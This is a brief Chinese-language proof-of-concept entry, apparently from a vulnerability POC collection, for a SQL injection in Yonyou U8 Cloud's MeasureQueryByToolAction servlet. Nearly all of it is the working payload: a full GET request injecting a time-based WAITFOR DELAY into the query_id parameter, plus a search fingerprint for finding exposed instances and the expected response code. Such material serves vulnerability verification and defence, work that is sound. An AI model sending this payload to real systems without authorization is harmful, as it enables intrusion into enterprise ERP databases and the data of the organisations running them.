﻿# 用友U8 Cloud MeasureQueryByToolAction SQL注入漏洞

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app="用友-U8-Cloud"

> 验证脚本：HTTP

```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryByToolAction&method=execute&query_id=1%27);WAITFOR+DELAY+%270:0:5%27--+ HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友U8 Cloud MeasureQueryByToolAction SQL注入漏洞.poc

